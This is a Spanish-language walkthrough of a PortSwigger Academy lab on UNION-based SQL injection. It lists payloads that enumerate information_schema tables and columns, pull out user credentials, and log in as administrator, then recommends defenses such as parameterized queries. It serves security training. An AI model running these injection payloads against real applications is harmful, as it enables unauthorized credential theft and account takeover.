Lab05: SQL injection attack, listing the database contents on non-Oracle databases

Nivel Practitioner
Tipo de SQLi SQL Injection basado en UNION

Objetivo

Enumerar las tablas de la base de datos, identificar la tabla que contiene las credenciales de usuario, extraer los nombres de usuario y contraseñas, y finalmente iniciar sesión como usuario administrator.

Vulnerabilidad

El filtro de categoría de productos es vulnerable a inyecciones SQL. La aplicación no valida la entrada del usuario en el parámetro category y, además, devuelve los resultados de la consulta en la respuesta, lo que permite realizar ataques UNION.

En bases de datos no Oracle (como PostgreSQL, MySQL o Microsoft SQL Server), la información del esquema se encuentra en la base de datos information_schema.

Procedimiento

  1. Interceptar la petición al seleccionar una categoría (por ejemplo, "Accessories") y enviarla al Repeater.
  2. Determinar el número de columnas probando payloads de UNION SELECT: 
    ' UNION SELECT NULL--

    Se añaden NULL hasta que la página cargue normalmente. Para este laboratorio, se determina que son 2 columnas:

    ' UNION SELECT NULL,NULL--
  3. Confirmar que las columnas aceptan texto usando valores de prueba: 
    ' UNION SELECT 'abc','def'--

    Al obtener respuesta, sabemos que existen dos columnas y que ambas pueden mostrar texto.

  4. Obtener los nombres de las tablas consultando information_schema.tables: 
    ' UNION SELECT table_name, NULL FROM information_schema.tables--

    En la respuesta se listan todas las tablas de la base de datos. Se busca una tabla con un nombre que parezca contener usuarios (ej. users_abcd, users_taavzn, etc.).

  5. Obtener los nombres de las columnas de la tabla de usuarios: 
    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_taavzn'--

    Se reemplaza 'users_taavzn' por el nombre real de la tabla encontrada. La respuesta mostrará columnas como username_abc, password_xyz, etc.

  6. Extraer las credenciales de la tabla de usuarios: 
    ' UNION SELECT username_abc, password_xyz FROM users_taavzn--

    En la respuesta aparecerán los nombres de usuario y contraseñas, incluyendo las del administrador.

  7. Iniciar sesión con las credenciales obtenidas del usuario administrator.

Payloads utilizados

Payload 1 (prueba de columnas)

' UNION SELECT 'abc','def'--

Payload 2 (enumeración de tablas)

' UNION SELECT table_name, NULL FROM information_schema.tables--

Payload 3 (enumeración de columnas)

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_taavzn'--

Payload 4 (extracción de credenciales)

' UNION SELECT username_abc, password_xyz FROM users_taavzn--

Explicación de los payloads

  • Payload 1: ' UNION SELECT 'abc','def'-- : Se utiliza para confirmar que las dos columnas existentes son vulnerables y pueden mostrar texto.
  • Payload 2: ' UNION SELECT table_name, NULL FROM information_schema.tables-- : Consulta el catálogo information_schema.tables para obtener los nombres de todas las tablas de la base de datos.
  • Payload 3: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_taavzn'-- : Obtiene los nombres de las columnas de la tabla de usuarios específica.
  • Payload 4: ' UNION SELECT username_abc, password_xyz FROM users_taavzn-- : Extrae los datos de las columnas identificadas, mostrando las credenciales de todos los usuarios.

Verificación del ataque

Al enviar el payload de extracción de credenciales, la respuesta HTTP muestra las credenciales de los usuarios en formato legible, por ejemplo:

administrator: 8fg5h2j1
carlos: password123
wieners: passw0rd

Con las credenciales del administrador, se accede al panel de administración, confirmando que la inyección SQL fue exitosa y que se ha comprometido la confidencialidad de la base de datos.

Resultado esperado: El laboratorio se resuelve correctamente al iniciar sesión como administrator y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.

Mitigación recomendada

Consultas Preparadas (Parameterized Queries)

Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los comandos SQL inyectados se tratan como simples datos y no como código ejecutable.

SELECT * FROM products WHERE category = ? AND released = 1

Validación de entrada

Permitir solo valores esperados para el parámetro de categoría (lista blanca).

Principio de mínimo privilegio

La cuenta de base de datos debe tener permisos estrictamente necesarios. No debería tener acceso a information_schema si no es imprescindible.

Gestión segura de errores

No mostrar errores detallados de base de datos al usuario. Mostrar mensajes genéricos y guardar detalles en logs internos.

Escapado de caracteres especiales

Como defensa adicional, escapar correctamente los caracteres como comillas simples.
